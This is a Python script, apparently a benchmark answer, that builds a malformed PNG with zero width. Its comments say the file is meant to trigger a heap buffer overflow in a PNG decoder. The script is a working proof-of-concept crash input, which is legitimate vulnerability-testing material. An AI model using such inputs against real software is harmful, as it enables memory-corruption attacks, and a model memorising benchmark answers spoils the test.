import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG file with zero width or height to trigger heap buffer overflow
        # Based on typical PNG structure with IHDR chunk containing width=0
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero width
        width = 0
        height = 100  # Non-zero height to pass some basic checks
        bit_depth = 8
        color_type = 2  # RGB
        compression = 0
        filter_method = 0
        interlace = 0
        
        ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, 
                               color_type, compression, filter_method, interlace)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
        
        # IDAT chunk with minimal image data
        # For zero width, row data would be empty, but we include some data
        # to trigger the overflow when processing
        scanline_length = 0  # Zero width means no pixel data per scanline
        filter_byte = 0  # No filter
        row_data = bytes([filter_byte])  # Just the filter byte
        
        # Compress the minimal image data
        compressed_data = zlib.compress(row_data * height)
        idat_chunk = self._make_chunk(b'IDAT', compressed_data)
        
        # IEND chunk
        iend_chunk = self._make_chunk(b'IEND', b'')
        
        # Combine all chunks
        png_data = png_signature + ihdr_chunk + idat_chunk + iend_chunk
        
        return png_data
    
    def _make_chunk(self, chunk_type, data):
        """Create a PNG chunk with CRC checksum."""
        length = len(data)
        chunk = struct.pack('>I', length) + chunk_type + data
        
        # Calculate CRC32
        crc = zlib.crc32(chunk_type + data) & 0xffffffff
        chunk += struct.pack('>I', crc)
        
        return chunk